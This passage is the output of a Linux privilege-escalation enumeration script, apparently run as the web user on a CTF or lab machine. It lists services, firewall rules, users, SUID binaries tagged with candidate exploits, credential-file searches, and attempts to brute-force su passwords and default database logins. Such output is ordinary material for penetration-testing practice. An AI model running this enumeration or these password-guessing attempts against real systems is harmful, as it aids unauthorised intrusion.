+:1.33                          21389 busctl          http            :1.33         httpd.service            -       -
+:1.7                             379 systemd         commander       :1.7          user@1000.service        -       -
+:1.8                             368 Xorg            root            :1.8          lightdm.service          -       -
+:1.9                             425 lightdm         root            :1.9          session-c1.scope         c1      -
+org.freedesktop.Avahi              - -               -               (activatable) -                        -       -
+org.freedesktop.ColorManager       - -               -               (activatable) -                        -       -
+org.freedesktop.DBus               1 systemd         root            -             init.scope               -       -
+org.freedesktop.DisplayManager   356 lightdm         root            :1.3          lightdm.service          -       -
+org.freedesktop.PolicyKit1       470 polkitd         polkitd         :1.15         polkit.service           -       -
+org.freedesktop.UPower           523 upowerd         root            :1.21         upower.service           -       -
+org.freedesktop.home1              - -               -               (activatable) -                        -       -
+org.freedesktop.hostname1          - -               -               (activatable) -                        -       -
+org.freedesktop.import1            - -               -               (activatable) -                        -       -
+org.freedesktop.locale1            - -               -               (activatable) -                        -       -
+org.freedesktop.login1           259 systemd-logind  root            :1.1          systemd-logind.service   -       -
+org.freedesktop.machine1           - -               -               (activatable) -                        -       -
+org.freedesktop.network1         596 systemd-network systemd-network :1.23         systemd-networkd.service -       -
+org.freedesktop.portable1          - -               -               (activatable) -                        -       -
+org.freedesktop.resolve1           - -               -               (activatable) -                        -       -
+org.freedesktop.systemd1           1 systemd         root            :1.0          init.scope               -       -
+org.freedesktop.timedate1          - -               -               (activatable) -                        -       -
+org.freedesktop.timesync1          - -               -               (activatable) -                        -       -
+
+
+═══════════════════════════════════╣ Network Information ╠════════════════════════════════════
+[+] Hostname, hosts and DNS
+nukem
+127.0.0.1 localhost
+127.0.1.1 nukem.localdomain hutchai
+::1
+nameserver 192.168.169.254
+
+[+] Content of /etc/inetd.conf & /etc/xinetd.conf
+/etc/inetd.conf Not Found
+
+[+] Interfaces
+ens192: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 192.168.169.105  netmask 255.255.255.0  broadcast 192.168.169.255
+        inet6 fe80::250:56ff:febf:fcdc  prefixlen 64  scopeid 0x20<link>
+        ether 00:50:56:bf:fc:dc  txqueuelen 1000  (Ethernet)
+        RX packets 2910492  bytes 489877561 (467.1 MiB)
+        RX errors 0  dropped 12  overruns 0  frame 0
+        TX packets 2772930  bytes 987015414 (941.2 MiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 28  bytes 1400 (1.3 KiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 28  bytes 1400 (1.3 KiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+
+[+] Networks and neighbours
+Kernel IP routing table
+Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
+default         _gateway        0.0.0.0         UG    0      0        0 ens192
+192.168.169.0   0.0.0.0         255.255.255.0   U     0      0        0 ens192
+Address                  HWtype  HWaddress           Flags Mask            Iface
+_gateway                 ether   00:50:56:9f:d0:96   C                     ens192
+
+[+] Iptables rules
+*filter
+:INPUT ACCEPT [0:0]
+:FORWARD ACCEPT [0:0]
+:OUTPUT ACCEPT [0:0]
+COMMIT
+*filter
+:INPUT ACCEPT [0:0]
+:FORWARD ACCEPT [0:0]
+:OUTPUT ACCEPT [0:0]
+COMMIT
+*filter
+:INPUT ACCEPT [0:0]
+:FORWARD ACCEPT [0:0]
+:OUTPUT ACCEPT [0:0]
+-A INPUT -i lo -j ACCEPT
+-A INPUT -m conntrack --ctstate NEW,RELATED,ESTABLISHED -j ACCEPT
+-A INPUT -p tcp -m tcp --dport 22 -j ACCEPT
+-A INPUT -p tcp -m tcp --dport 80 -j ACCEPT
+-A INPUT -p tcp -m tcp --dport 3306 -j ACCEPT
+-A INPUT -p tcp -m tcp --dport 5000 -j ACCEPT
+-A INPUT -p tcp -m tcp --dport 13000 -j ACCEPT
+-A INPUT -p tcp -m tcp --dport 36445 -j ACCEPT
+-A INPUT -p udp -m udp --dport 53 -j ACCEPT
+-A INPUT -p icmp -m icmp --icmp-type 8 -j ACCEPT
+-A INPUT -p icmp -m icmp --icmp-type 0 -j ACCEPT
+-A INPUT -j DROP
+-A OUTPUT -o lo -j ACCEPT
+-A OUTPUT -p tcp -m tcp --dport 22 -m state --state NEW,ESTABLISHED -j ACCEPT
+-A OUTPUT -p tcp -m tcp --sport 22 -m state --state NEW,ESTABLISHED -j ACCEPT
+-A OUTPUT -p tcp -m tcp --dport 80 -m state --state NEW,ESTABLISHED -j ACCEPT
+-A OUTPUT -p tcp -m tcp --sport 80 -m state --state NEW,ESTABLISHED -j ACCEPT
+-A OUTPUT -p tcp -m tcp --dport 3306 -m state --state NEW,ESTABLISHED -j ACCEPT
+-A OUTPUT -p tcp -m tcp --sport 3306 -m state --state NEW,ESTABLISHED -j ACCEPT
+-A OUTPUT -p tcp -m tcp --dport 5000 -m state --state NEW,ESTABLISHED -j ACCEPT
+-A OUTPUT -p tcp -m tcp --sport 5000 -m state --state NEW,ESTABLISHED -j ACCEPT
+-A OUTPUT -p tcp -m tcp --dport 13000 -m state --state NEW,ESTABLISHED -j ACCEPT
+-A OUTPUT -p tcp -m tcp --sport 13000 -m state --state NEW,ESTABLISHED -j ACCEPT
+-A OUTPUT -p tcp -m tcp --dport 36445 -m state --state NEW,ESTABLISHED -j ACCEPT
+-A OUTPUT -p tcp -m tcp --sport 36445 -m state --state NEW,ESTABLISHED -j ACCEPT
+-A OUTPUT -p udp -m udp --dport 53 -m state --state NEW,ESTABLISHED -j ACCEPT
+-A OUTPUT -p icmp -m icmp --icmp-type 8 -j ACCEPT
+-A OUTPUT -p icmp -m icmp --icmp-type 0 -j ACCEPT
+-A OUTPUT -j DROP
+COMMIT
+*filter
+:INPUT DROP [0:0]
+:FORWARD DROP [0:0]
+:OUTPUT ACCEPT [0:0]
+-A INPUT -p icmp -j ACCEPT
+-A INPUT -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT
+-A INPUT -i lo -j ACCEPT
+-A INPUT -p tcp -j REJECT --reject-with tcp-reset
+-A INPUT -p udp -j REJECT --reject-with icmp-port-unreachable
+-A INPUT -j REJECT --reject-with icmp-proto-unreachable
+COMMIT
+
+[+] Active Ports
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports
+tcp        0      0 127.0.0.1:5901          0.0.0.0:*               LISTEN      -
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
+tcp        0      0 0.0.0.0:36445           0.0.0.0:*               LISTEN      -
+tcp        0      0 0.0.0.0:5000            0.0.0.0:*               LISTEN      -
+tcp        0      0 0.0.0.0:13000           0.0.0.0:*               LISTEN      556/nginx: worker p
+tcp6       0      0 :::3306                 :::*                    LISTEN      -
+tcp6       0      0 :::80                   :::*                    LISTEN      -
+tcp6       0      0 :::22                   :::*                    LISTEN      -
+tcp6       0      0 :::36445                :::*                    LISTEN      -
+
+[+] Can I sniff with tcpdump?
+No
+
+[+] Internet Access?
+Ping is not available
+DNS not available
+Port 443 is not accessible
+Port 80 is not accessible
+
+
+════════════════════════════════════╣ Users Information ╠════════════════════════════════════
+[+] My user
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#users
+uid=33(http) gid=33(http) groups=33(http)
+
+[+] Do I have PGP keys?
+/usr/bin/gpg
+netpgpkeys Not Found
+netpgp Not Found
+
+[+] Clipboard or highlighted text?
+xsel and xclip Not Found
+
+[+] Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
+
+[+] Checking sudo tokens
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#reusing-sudo-tokens
+/proc/sys/kernel/yama/ptrace_scope is not enabled (1)
+gdb wasn't found in PATH
+
+[+] Checking doas.conf
+/etc/doas.conf Not Found
+
+[+] Checking Pkexec policy
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe#pe-method-2
+
+[+] Superusers
+root:x:0:0::/root:/bin/bash
+
+[+] Users with console
+commander:x:1000:1000::/home/commander:/bin/bash
+root:x:0:0::/root:/bin/bash
+
+[+] All users & groups
+uid=0(root) gid=0(root) groups=0(root)
+uid=1(bin) gid=1(bin) groups=1(bin),3(sys),2(daemon[0m)
+uid=1000(commander) gid=1000(commander) groups=1000(commander)
+uid=102(polkitd) gid=102(polkitd) groups=102(polkitd),26(proc)
+uid=14(ftp) gid=11(ftp) groups=11(ftp)
+uid=140(usbmux) gid=140(usbmux) groups=140(usbmux)
+uid=2(daemon[0m) gid=2(daemon[0m) groups=2(daemon[0m),999(adm),1(bin)
+uid=33(http) gid=33(http) groups=33(http)
+uid=65534(nobody) gid=65534(nobody) groups=65534(nobody)
+uid=68(uuidd) gid=68(uuidd) groups=68(uuidd)
+uid=8(mail) gid=12(mail) groups=12(mail)
+uid=81(dbus) gid=81(dbus) groups=81(dbus)
+uid=973(git) gid=973(git) groups=973(git)
+uid=974(lightdm) gid=974(lightdm) groups=974(lightdm)
+uid=975(colord) gid=975(colord) groups=975(colord)
+uid=976(avahi) gid=976(avahi) groups=976(avahi)
+uid=977(mysql) gid=977(mysql) groups=977(mysql)
+uid=978(systemd-coredump) gid=978(systemd-coredump) groups=978(systemd-coredump)
+uid=979(systemd-timesync) gid=979(systemd-timesync) groups=979(systemd-timesync)
+uid=980(systemd-resolve) gid=980(systemd-resolve) groups=980(systemd-resolve)
+uid=981(systemd-network) gid=981(systemd-network) groups=981(systemd-network)
+uid=982(systemd-journal-remote) gid=982(systemd-journal-remote) groups=982(systemd-journal-remote)
+
+[+] Login now
+ 10:58:14 up  2:53,  0 users,  load average: 0.35, 0.13, 0.08
+USER     TTY        LOGIN@   IDLE   JCPU   PCPU WHAT
+
+[+] Last logons
+reboot   system boot  Wed Mar 31 00:21:55 2021   still running                         0.0.0.0
+reboot   system boot  Wed Mar 10 19:09:38 2021   still running                         0.0.0.0
+reboot   system boot  Thu Oct 29 16:23:44 2020   still running                         0.0.0.0
+
+wtmp begins Thu Oct 29 16:02:17 2020
+
+[+] Last time logon each user
+Username         Port     From             Latest
+
+[+] Password policy
+PASS_MAX_DAYS   99999
+PASS_MIN_DAYS   0
+PASS_WARN_AGE   7
+ENCRYPT_METHOD  SHA512
+
+[+] Testing 'su' as other users with shell using as passwords: null pwd, the username and top2000pwds
+  Bruteforcing user root...
+  Bruteforcing user commander...
+[+] Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!
+
+
+═══════════════════════════════════╣ Software Information ╠═══════════════════════════════════
+[+] MySQL version
+mysql  Ver 15.1 Distrib 10.5.5-MariaDB, for Linux (x86_64) using readline 5.1
+
+[+] MySQL connection using default root/root ........... No
+[+] MySQL connection using root/toor ................... No
+[+] MySQL connection using root/NOPASS ................. No
+[+] Searching mysql credentials and exec
+
+[+] PostgreSQL version and pgadmin credentials
+ Not Found
+
+[+] PostgreSQL connection to template0 using postgres/NOPASS ........ No
+[+] PostgreSQL connection to template1 using postgres/NOPASS ........ No
+[+] PostgreSQL connection to template0 using pgsql/NOPASS ........... No
+[+] PostgreSQL connection to template1 using pgsql/NOPASS ........... No
+
+[+] Apache server info
+Version: Server version: Apache/2.4.46 (Unix)
+Server built:   Aug 21 2020 21:57:59
+PHP exec extensions
+
+[+] Searching PHPCookies
+ Not Found
+
+[+] Searching Wordpress wp-config.php files
+wp-config.php Not Found
+
+[+] Searching Drupal settings.php files
+/default/settings.php Not Found
+
+[+] Searching Moodle config.php files
+config.php inside a moodle folder Not Found
+
+[+] Searching Tomcat users file
+tomcat-users.xml Not Found
+
+[+] Mongo information
+mongo binary Not Found
+
+[+] Searching supervisord configuration file
+supervisord.conf Not Found
+
+[+] Searching cesi configuration file
+cesi.conf Not Found
+
+[+] Searching Rsyncd config file
+rsyncd.conf Not Found
+[+] Searching Hostapd config file
+hostapd.conf Not Found
+
+[+] Searching wifi conns file
+ Not Found
+
+[+] Searching Anaconda-ks config files
+anaconda-ks.cfg Not Found
+
+[+] Searching .vnc directories and their passwd files
+/home/commander/.vnc
+
+
+
+[+] Searching ldap directories and their hashes
+ldap Not Found
+
+[+] Searching .ovpn files and credentials
+.ovpn Not Found
+
+[+] Searching ssl/ssh files
+PermitRootLogin yes
+ChallengeResponseAuthentication no
+UsePAM yes
+
+Searching inside /etc/ssh/ssh_config for interesting info
+
+[+] Searching unexpected auth lines in /etc/pam.d/sshd
+auth      include   system-remote-login
+
+[+] Searching Cloud credentials (AWS, Azure, GC)
+
+[+] NFS exports?
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe
+/etc/exports Not Found
+
+[+] Searching kerberos conf files and tickets
+[i] https://book.hacktricks.xyz/pentesting/pentesting-kerberos-88#pass-the-ticket-ptt
+kadmin was found on /usr/bin/kadmin
+klist execution
+-rw-r--r-- 1 root root 369 May 23  2020 /etc/krb5.conf
+-rw-r--r-- 1 root root 369 May 23  2020 /usr/share/doc/krb5/examples/krb5.conf
+tickets kerberos Not Found
+klist Not Found
+
+[+] Searching Kibana yaml
+kibana.yml Not Found
+
+[+] Searching Knock configuration
+Knock.config Not Found
+
+[+] Searching logstash files
+ Not Found
+
+[+] Searching elasticsearch files
+ Not Found
+
+[+] Searching Vault-ssh files
+vault-ssh-helper.hcl Not Found
+
+[+] Searching AD cached hashes
+cached hashes Not Found
+
+[+] Searching screen sessions
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions
+screen Not Found
+
+[+] Searching tmux sessions
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions
+tmux Not Found
+
+[+] Searching Couchdb directory
+
+[+] Searching redis.conf
+
+[+] Searching dovecot files
+dovecot credentials Not Found
+
+[+] Searching mosquitto.conf
+
+[+] Searching neo4j auth file
+
+[+] Searching Cloud-Init conf file
+
+[+] Searching Erlang cookie file
+
+[+] Searching GVM auth file
+
+[+] Searching IPSEC files
+
+[+] Searching IRSSI files
+
+[+] Searching Keyring files
+Keyring folder: /usr/share/pacman/keyrings
+/usr/share/pacman/keyrings:
+total 1332
+-rw-r--r-- 1 root root    1435 Aug 20  2020 archlinux-revoked
+-rw-r--r-- 1 root root     220 Aug 20  2020 archlinux-trusted
+-rw-r--r-- 1 root root 1352563 Aug 20  2020 archlinux.gpg
+
+[+] Searching Filezilla sites file
+
+[+] Searching backup-manager files
+
+[+] Searching uncommon passwd files (splunk)
+
+[+] Searching GitLab related files
+
+
+[+] Searching PGP/GPG
+PGP/GPG software:
+/usr/bin/gpg
+netpgpkeys Not Found
+netpgp Not Found
+
+[+] Searching vim files
+
+[+] Checking if containerd(ctr) is available
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/containerd-ctr-privilege-escalation
+
+[+] Checking if runc is available
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/runc-privilege-escalation
+
+[+] Searching docker files
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-docker-socket
+
+[+] Interesting Firefox Files
+[i] https://book.hacktricks.xyz/forensics/basic-forensics-esp/browser-artifacts#firefox
+
+[+] Interesting Chrome Files
+[i] https://book.hacktricks.xyz/forensics/basic-forensics-esp/browser-artifacts#firefox
+
+[+] Autologin Files
+
+[+] S/Key authentication
+
+[+] YubiKey authentication
+
+[+] Passwords inside pam.d
+
+[+] FastCGI Params
+
+[+] SNMPs
+
+
+
+════════════════════════════════════╣ Interesting Files ╠════════════════════════════════════
+[+] SUID - Check easy privesc, exploits and write perms
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
+strings Not Found
+strace Not Found
+-rwsr-sr-x 1 root root  43K Jan  4  2020 /usr/bin/mount.cifs
+-rwsr-xr-x 1 root root  34K May 16  2020 /usr/bin/fusermount
+-rwsr-xr-x 1 root root  54K May 23  2020 /usr/bin/ksu
+-rwsr-x--- 1 root dbus  58K Jul  2  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwsr-xr-x 1 root root 2.5M Jul  7  2020 /usr/bin/dosbox (Unknown SUID binary)
+-rwsr-xr-x 1 root root  18K Aug  3  2020 /usr/lib/polkit-1/polkit-agent-helper-1
+-rwsr-xr-x 1 root root  26K Aug  3  2020 /usr/bin/pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)
+-rwsr-sr-x 1 root root  38K Aug 12  2020 /usr/bin/unix_chkpwd
+-rwsr-sr-t 1 root root  14K Aug 20  2020 /usr/bin/vmware-user-suid-wrapper
+-rwsr-xr-x 1 root root  18K Aug 21  2020 /usr/bin/suexec
+-rws--x--x 1 root root 463K Aug 30  2020 /usr/lib/ssh/ssh-keysign
+-rwsr-xr-x 1 root root  15K Sep  2  2020 /usr/lib/Xorg.wrap
+-rwsr-xr-x 1 root root  44K Sep  7  2020 /usr/bin/sg
+-rwsr-xr-x 1 root root  63K Sep  7  2020 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
+-rwsr-xr-x 1 root root  79K Sep  7  2020 /usr/bin/gpasswd
+-rwsr-xr-x 1 root root  27K Sep  7  2020 /usr/bin/expiry
+-rwsr-xr-x 1 root root  71K Sep  7  2020 /usr/bin/chage
+-rwsr-xr-x 1 root root  34K Sep 10  2020 /usr/bin/umount  --->  BSD/Linux(08-1996)
+-rwsr-xr-x 1 root root  66K Sep 10  2020 /usr/bin/su
+-rwsr-xr-x 1 root root  18K Sep 10  2020 /usr/bin/newgrp  --->  HP-UX_10.20
+-rwsr-xr-x 1 root root  50K Sep 10  2020 /usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
+-rwsr-xr-x 1 root root  30K Sep 10  2020 /usr/bin/chsh
+-rwsr-xr-x 1 root root  34K Sep 10  2020 /usr/bin/chfn  --->  SuSE_9.3/10
+-rwsr-xr-x 1 root root 159K Sep 24  2020 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
+
+[+] SGID
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
+-rwsr-sr-x 1 root root 43K Jan  4  2020 /usr/bin/mount.cifs
+-rwsr-sr-x 1 root root 38K Aug 12  2020 /usr/bin/unix_chkpwd
+-rwsr-sr-t 1 root root 14K Aug 20  2020 /usr/bin/vmware-user-suid-wrapper
+-rwxr-sr-x 1 root tty  22K Sep 10  2020 /usr/bin/write
+-rwxr-sr-x 1 root tty  34K Sep 10  2020 /usr/bin/wall
+
+[+] Checking misconfigurations of ld.so
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#ld-so
+/etc/ld.so.conf
+# Dynamic linker/loader configuration.
+# See ld.so(8) and ldconfig(8) for details.
+
+include /etc/ld.so.conf.d/*.conf
+/etc/ld.so.conf.d
+  /etc/ld.so.conf.d/*
+
+[+] Capabilities
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities
+Current capabilities:
+Current: =
+CapInh: 0000000000000000
+CapPrm: 0000000000000000
+CapEff: 0000000000000000
+CapBnd: 000000ffffffffff
+CapAmb: 0000000000000000
+
+Shell capabilities:
+0x0000000000000000=
+CapInh: 0000000000000000
+CapPrm: 0000000000000000
+CapEff: 0000000000000000
+CapBnd: 000000ffffffffff
+CapAmb: 0000000000000000
+
+Files with capabilities (limited to 50):
+/usr/bin/rlogin cap_net_bind_service=ep
+/usr/bin/rsh cap_net_bind_service=ep
+/usr/bin/newgidmap cap_setgid=ep
+/usr/bin/rcp cap_net_bind_service=ep
+/usr/bin/newuidmap cap_setuid=ep
+
+[+] Users with capabilities
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities
+/etc/security/capability.conf Not Found
+
+[+] Files with ACLs (limited to 50)
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#acls
+files with acls in searched folders Not Found
+
+[+] .sh files in path
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#script-binaries-in-path
+/usr/bin/gettext.sh
+/usr/bin/jemalloc.sh
+/usr/bin/findssl.sh
+
+[+] Unexpected in root
+/lost+found
+/build_arch.sh
+
+[+] Files (scripts) in /etc/profile.d/
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#profiles-files
+total 44
+drwxr-xr-x  2 root root 4096 Sep 18  2020 .
+drwxr-xr-x 59 root root 4096 Oct 14  2020 ..
+-rw-r--r--  1 root root  545 May  9  2020 freetype2.sh
+-rw-r--r--  1 root root 1107 Apr 15  2020 gawk.csh
+-rw-r--r--  1 root root  757 Apr 15  2020 gawk.sh
+-rwxr-xr-x  1 root root  105 Sep 15  2020 gpm.sh
+-rw-r--r--  1 root root  766 Aug 21  2020 locale.sh
+-rw-r--r--  1 root root  468 Jun 21  2020 perlbin.csh
+-rw-r--r--  1 root root  455 Jun 21  2020 perlbin.sh
+-rw-r--r--  1 root root  962 May 29  2020 vte.csh
+-rw-r--r--  1 root root 1364 May 29  2020 vte.sh
+
+[+] Permissions in init, init.d, systemd, and rc.d
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#init-init-d-systemd-and-rc-d
+
+[+] Hashes inside passwd file? ........... No
+[+] Writable passwd file? ................ No
+[+] Credentials in fstab/mtab? ........... No
+[+] Can I read shadow files? ............. No
+[+] Can I read opasswd file? ............. No
+[+] Can I write in network-scripts? ...... No
+[+] Can I read root folder? .............. No
+
+[+] Searching root files in home dirs (limit 30)
+/home/
+/root/
+
+[+] Searching folders owned by me containing others files on it
+
+[+] Readable files belonging to root and readable by me but not world readable
+
+[+] Modified interesting files in the last 5mins (limit 100)
+/var/log/journal/54ecd58cf3cf489fa4da8e9f52e4440e/system.journal
+/srv/http/.gnupg/trustdb.gpg
+/srv/http/.gnupg/pubring.kbx
+
+[+] Writable log files (logrotten) (limit 100)
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#logrotate-exploitation
+logrotate Not Found
+Writable folder: /srv/http/wp-content/plugins/simple-file-list/view/ee-view-error.log
+Writable folder: /srv/http/wp-content/plugins/simple-file-list/logs/ee-email-error.log
+Writable folder: /srv/http/wp-content/plugins/simple-file-list/logs/ee-upload-error.log
+Writable folder: /srv/http/wp-content/plugins/simple-file-list/logs/ee-file-error.log
+Writable folder: /srv/http/wp-content/themes/simple-file-list/view/ee-view-error.log
+Writable folder: /srv/http/wp-content/themes/simple-file-list/logs/ee-email-error.log
+Writable folder: /srv/http/wp-content/themes/simple-file-list/logs/ee-upload-error.log
+Writable folder: /srv/http/wp-content/themes/simple-file-list/logs/ee-file-error.log
+
+[+] Files inside /home/http (limit 20)
+
+[+] Files inside others home (limit 20)
+/home/commander/python_rest_flask/.gitignore
+/home/commander/python_rest_flask/README.md
+/home/commander/python_rest_flask/server.py
+/home/commander/python_rest_flask/test.txt
+/home/commander/python_rest_flask/requirements.txt
+/home/commander/python_rest_flask/chinook.db
+/home/commander/.vnc/passwd
+/home/commander/.vnc/config
+/home/commander/.vnc/nukem:1.log
+/home/commander/.xsession-errors
+/home/commander/.ICEauthority
+/home/commander/.cache/event-sound-cache.tdb.54ecd58cf3cf489fa4da8e9f52e4440e.x86_64-pc-linux-gnu
+/home/commander/.dmrc
+/home/commander/.xsession-errors.old
+/home/commander/.bashrc
+/home/commander/.bash_history
+/home/commander/local.txt
+/home/commander/.Xauthority
+/home/commander/.bash_profile
+/home/commander/.bash_logout
+
+[+] Searching installed mail applications
+
+[+] Mails (limit 50)
+
+[+] Backup folders
+
+[+] Backup files (limited 100)
+-rw-r--r-- 1 root root 17280 Mar 10 19:09 /var/log/Xorg.0.log.old
+-rw-r--r-- 1 root root 2852 Sep 13  2020 /usr/lib/modules/5.8.9-arch2-1/kernel/drivers/power/supply/wm831x_backup.ko.xz
+-rw-r--r-- 1 root root 2376 Sep 13  2020 /usr/lib/modules/5.8.9-arch2-1/kernel/drivers/net/team/team_mode_activebackup.ko.xz
+-rw-r--r-- 1 root root 27406 Aug 14  2020 /usr/lib/python3.8/site-packages/samba/tests/domain_backup.py
+-rw-r--r-- 1 root root 6750 Aug 14  2020 /usr/lib/python3.8/site-packages/samba/tests/ntacls_backup.py
+-rw-r--r-- 1 root root 5307 Aug 14  2020 /usr/lib/python3.8/site-packages/samba/tests/domain_backup_offline.py
+-rw-r--r-- 1 root root 50384 Aug 14  2020 /usr/lib/python3.8/site-packages/samba/netcmd/domain_backup.py
+-rwxr-xr-x 1 root root 38712 Aug 20  2020 /usr/lib/open-vm-tools/plugins/vmsvc/libvmbackup.so
+-rw-r--r-- 1 root root 42 Aug 20  2020 /usr/share/man/man1/mariadb-backup.1.gz
+-rw-r--r-- 1 root root 500 Jun 17  2020 /usr/share/man/man1/idevicebackup.1.gz
+-rw-r--r-- 1 root root 819 Jun 17  2020 /usr/share/man/man1/idevicebackup2.1.gz
+-rw-r--r-- 1 root root 351 Aug 20  2020 /usr/share/man/man1/wsrep_sst_mariabackup.1.gz
+-rw-r--r-- 1 root root 336 Aug 20  2020 /usr/share/man/man1/mariabackup.1.gz
+-rw-r--r-- 1 root root 1454 Aug 20  2020 /usr/share/man/man1/myrocks_hotbackup.1.gz
+-rw-r--r-- 1 root root 1663 Mar 28  2020 /usr/share/man/man8/tdbbackup.8.gz
+-rw-r--r-- 1 root root 6376 Aug 20  2020 /usr/share/doc/open-vm-tools/api/html/vmbackup_8h_source.html
+-rw-r--r-- 1 root root 4733 Aug 20  2020 /usr/share/doc/open-vm-tools/api/html/vmbackup_8h.html
+-rwxr-xr-x 1 root root 1497 Jul  1  2020 /usr/share/makepkg/lint_pkgbuild/backup.sh
+-rwxr-xr-x 1 root root 1259 Jul  1  2020 /usr/share/makepkg/lint_package/missing_backup.sh
+-rwxr-xr-x 1 root root 2743 Aug 14  2020 /usr/share/ctdb/tests/INTEGRATION/database/basics.010.backup_restore.sh
+-rwxr-xr-x 1 root root 25050 Aug 20  2020 /usr/bin/myrocks_hotbackup
+-rwxr-xr-x 1 root root 36967 Aug 20  2020 /usr/bin/wsrep_sst_mariabackup
+-rwxr-xr-x 1 root root 63240 Jun 17  2020 /usr/bin/idevicebackup2
+-rwxr-xr-x 1 root root 46856 Jun 17  2020 /usr/bin/idevicebackup
+-rwxr-xr-x 1 root root 23976640 Aug 20  2020 /usr/bin/mariadb-backup
+-rw-r--r-- 1 root root 1547 Aug 20  2020 /usr/include/mysql/server/private/aria_backup.h
+-rw-r--r-- 1 root root 9005 Jun 17  2020 /usr/include/libimobiledevice/mobilebackup2.h
+-rw-r--r-- 1 root root 10073 Jun 17  2020 /usr/include/libimobiledevice/mobilebackup.h
+
+[+] Searching tables inside readable .db/.sql/.sqlite files (limit 100)
+
+[+] Web files?(output limit)
+
+[+] Readable hidden interesting files
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#read-sensitive-data
+
+[+] All hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)
+-rw-r--r-- 1 root root 208 Sep 30  2020 /var/.updated
+-rw-r--r-- 1 root root 40 Jul 27  2020 /usr/share/git/vscode/.gitattributes
+-rw-r--r-- 1 root root 14 Jul 27  2020 /usr/share/git/completion/.gitattributes
+-rw-r--r-- 1 root root 1235 Jul 27  2020 /usr/share/git/mw-to-git/.perlcriticrc
+-rw-r--r-- 1 root root 24 Jul 27  2020 /usr/share/git/workdir/.gitattributes
+-rw-r--r-- 1 root root 39 May 23  2020 /usr/share/man/man5/.k5login.5.gz
+-rw-r--r-- 1 root root 42 May 23  2020 /usr/share/man/man5/.k5identity.5.gz
+-rw-r--r-- 1 root root 208 Sep 30  2020 /etc/.updated
+-rw-r--r-- 1 root root 57 Aug  9  2020 /etc/skel/.bash_profile
+-rw-r--r-- 1 root root 21 Aug  9  2020 /etc/skel/.bash_logout
+-rw------- 1 root root 0 Sep 18  2020 /etc/.pwd.lock
+-rw-r--r-- 1 root root 0 Sep 18  2020 /etc/pacman.d/gnupg/.gpg-v21-migrated
+-rw------- 1 commander commander 3697 Sep 18  2020 /home/commander/.xsession-errors
+-rw------- 1 commander commander 0 Sep 18  2020 /home/commander/.ICEauthority
+-rw-r--r-- 1 commander commander 23 Sep 18  2020 /home/commander/.dmrc
+-rw------- 1 commander commander 569 Sep 18  2020 /home/commander/.xsession-errors.old
+-rw------- 1 commander commander 271 Mar 31 00:21 /home/commander/.Xauthority
+-rw-r--r-- 1 commander commander 57 Aug  9  2020 /home/commander/.bash_profile
+-rw-r--r-- 1 commander commander 21 Aug  9  2020 /home/commander/.bash_logout
+-rw-r--r-- 1 http nobody 629 May  9  2016 /srv/http/wp-content/plugins/akismet/.htaccess
+-rw-r--r-- 1 http nobody 269 Oct 25  2019 /srv/http/wp-content/themes/twentytwenty/.stylelintrc.json
+-rw-r--r-- 1 http http 461 Sep 28  2020 /srv/http/.htaccess
+
+[+] Readable files inside /tmp, /var/tmp, /private/tmp, /private/var/at/tmp, /private/var/tmp, and backup folders (limit 70)
+-rw------- 1 http http 0 Jun  5 08:24 /tmp/sess_3i3r589q87hbqrdqf0m01rtj1a
+-rw------- 1 http http 0 Jun  5 08:24 /tmp/sess_hb0apt38kad8g6apobqo8pv6df
+-rw------- 1 http http 0 Jun  5 08:24 /tmp/sess_j8f4j3q2tfejn227ge4s1lh1r9
+-rw------- 1 http http 0 Jun  5 08:24 /tmp/sess_8erkv7ftuo47kmk3ign6mg0j73
+-rw------- 1 http http 0 Jun  5 08:24 /tmp/sess_o7km0k6he6rl1o8jdht2anbptg
